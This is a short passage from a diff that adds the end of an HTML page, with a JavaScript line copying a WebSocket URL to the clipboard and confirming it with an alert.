+  navigator.clipboard?.writeText(wsUrl).then(()=>alert('URL copied!')).catch(()=>{});
+}
+</script>
+</body>
+</html>
